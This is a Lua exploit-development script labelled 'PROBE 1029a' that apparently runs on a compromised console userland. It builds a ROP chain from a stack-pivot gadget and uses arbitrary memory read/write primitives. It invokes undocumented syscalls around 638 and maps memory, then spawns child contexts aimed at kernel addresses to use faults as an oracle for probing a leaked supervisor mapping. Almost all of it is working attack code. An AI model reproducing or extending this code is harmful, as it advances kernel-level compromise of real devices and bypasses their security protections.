-- CRASH_CLASS: HIGH
-- PROBE 1029a: how far does the 638 mapping extend, and which neighbours write?
--
-- 1028a: the qword 638 writes (0xFFFFFFFFFDC7BB70) faults with #PF error 5
-- (present, user-read protection violation) at 0xFFFFFFFFFDC7B000, so it is a
-- mapped supervisor page. This scan measures the extent of that mapping with the
-- same child-fault oracle, then asks the neighbouring syscalls for records.

print("=== PROBE 1029a: 638 NEIGHBOURHOOD ===")
local function to_num(v)
  if type(v)=="table" and v.tonumber then return v:tonumber() end
  if type(v)=="table" and v.h then return v.h*4294967296+v.l end
  return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function rq(a) local o,v=pcall(function() return memory.read_qword(uint64(a)) end) if o then return to_num(v) end return nil end
local function rd(a) local o,v=pcall(function() return memory.read_dword(uint64(a)) end) if o then return to_num(v) end return nil end

local BASE  = 0xFFFFFFFFFDC7A000   -- 8 KB below the leaked pointer, 8 pages
local STEP  = 0x1000
local COUNT = 8

local fd = rd(signal.fd_addr) or 0
local ph = gadgets.stack_pivot[1]
local ctxt = memory.alloc(8)
local chain = ropchain({ stack_base = to_num(ph.pivot_addr) })
chain:push_store_rdx_into_memory(ctxt)
chain:push_syscall_raw(syscall.write, function()
  chain:push_set_rdx(0x100)
  chain:push_set_rax_from_memory(ctxt)
  chain:push_add_to_rax(0xC0)
  chain:push_set_reg_from_rax("rsi")
  chain:push_set_reg_from_memory("rdi", signal.fd_addr)
end)
chain:push_syscall_raw(mk(431), function() chain:push_set_rdi(0) end)

local page = 0x4000
local function mmap(px)
  local _, a = pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
  local v = to_num(a)
  if v ~= 0 and v < 0x800000000000 then for o=0,px-8,8 do wq(v+o,0) end end
  return v
end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100}
local block = mmap(page*4)
local start = block + page*4 - 0x200
local ctx = memory.alloc(0x500)
local tb = memory.alloc(8)
local ts = memory.alloc(16)
local ctxa = as_addr(ctx)

-- [L] what 638 says right now
local qa = memory.alloc(0x100)
for o = 0, 0xF8, 8 do wq(as_addr(qa) + o, 0xCCCCCCCC) end
local okc, rvc = pcall(function() return mk(638)(uint64(0), uint64(0), uint64(as_addr(qa)), uint64(0x100), uint64(0), uint64(0)) end)
print(string.format("[L] 638 rv=%s out={0x%X, 0x%X} pid=%u", tostring(okc and to_num(rvc) or "ERR"), rq(as_addr(qa)) or 0, rq(as_addr(qa)+8) or 0, to_num(mk(20)())))

-- [O] mapping extent around it
local okn, fail = 0, 0
for i = 0, COUNT-1 do
  local target = BASE + i*STEP
  for o=0,0x4F8,8 do wq(ctxa+o,0) end
  wq(ctxa+Ctx.MAGIC,0x480); wq(ctxa+Ctx.TYPE,0x10000)
  wq(ctxa+Ctx.CS,0x43); wq(ctxa+Ctx.SS,0x3B)
  wq(ctxa+Ctx.RIP,target); wq(ctxa+Ctx.RSP,start)
  wq(as_addr(tb),0)
  print(string.format("[T%02d] 0x%X", i, target))
  local ok, rv = pcall(function() return mk(430)(uint64(ctxa),uint64(as_addr(tb)),uint64(0)) end)
  if ok and to_num(rv) == 0 then okn = okn + 1 else fail = fail + 1 end
  wq(as_addr(ts),0); wq(as_addr(ts)+8,120*1000000)
  pcall(function() mk(240)(uint64(as_addr(ts)),uint64(0)) end)
end
print(string.format("[O] spawned=%u failed=%u alive pid=%u", okn, fail, to_num(mk(20)())))

-- [N] neighbours in the 636..646 band, same shape that made 638 write
local N = {636, 640, 641, 642, 644, 645, 646, 647, 648, 650}
for _, n in ipairs(N) do
  for o = 0, 0xF8, 8 do wq(as_addr(qa) + o, 0xCCCCCCCC) end
  local ok, rv
  if n == 650 then
    ok, rv = pcall(function() return mk(n)(uint64(0), uint64(0), uint64(as_addr(qa)), uint64(0x100), uint64(0), uint64(0)) end)
  else
    ok, rv = pcall(function() return mk(n)(uint64(0), uint64(0), uint64(as_addr(qa)), uint64(0x100), uint64(0), uint64(0)) end)
  end
  local w = 0
  for o = 0, 0xF8, 8 do if rq(as_addr(qa)+o) ~= 0xCCCCCCCC then w = w + 1 end end
  print(string.format("[N] %u rv=%s written=%u first=0x%X", n, tostring(ok and to_num(rv) or "ERR"), w, rq(as_addr(qa)) or 0))
end
print(string.format("[Z] alive pid=%u", to_num(mk(20)())))
print("=== COMPLETE ===")
